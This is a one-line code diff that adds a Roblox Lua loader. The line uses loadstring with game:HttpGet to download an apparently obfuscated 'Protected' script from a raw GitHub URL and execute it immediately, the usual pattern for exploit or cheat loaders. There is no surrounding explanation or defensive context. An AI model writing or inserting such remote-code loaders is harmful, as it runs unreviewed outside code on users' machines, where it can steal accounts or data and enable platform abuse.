@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/storecanescombo/Outcvnju/refs/heads/main/Protected_9893402262141466.lua.txt"))()
